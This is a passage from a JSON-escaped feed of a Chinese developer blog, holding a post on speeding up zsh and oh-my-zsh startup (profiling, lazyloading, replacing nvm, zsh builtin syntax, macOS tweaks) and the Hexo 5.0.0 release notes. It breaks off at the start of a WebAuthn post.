profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key 